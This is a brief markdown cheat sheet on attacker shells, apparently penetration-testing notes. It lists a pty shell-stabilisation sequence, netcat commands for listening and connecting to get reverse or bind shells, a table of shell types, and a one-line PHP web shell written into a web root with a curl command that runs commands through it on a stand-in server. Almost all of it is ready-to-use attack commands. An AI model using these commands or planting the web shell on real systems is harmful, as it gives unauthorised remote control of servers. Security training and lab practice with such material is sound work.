# Shell



## Stabilizng shell
`python -c 'import pty; pty.spawn("/bin/bash")'`

`CTRL + Z`

`stty raw -echo; fg`

## Netcat commands with shell

| Commands | Description |
|----------|-------------|
| `nc -lvnp <port>` | Listen on port for connection |
| `nc -nv <ip address of computer with listener started><port being listened on>` | Connect to netcat listener |

## Types of shells
| Type of Shell| Method of Communication |
|--------------|-------------------------|
| Reverse Shell | Connects back to our system and gives us control through a reverse connection.|
| Bind Shell  | Waits for us to connect to it and gives us control once we do. |
| Web Shell     | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output. |

## Web Shell
| Commands | Description |
|----------|-------------|
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` |  Create a webshell php file |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |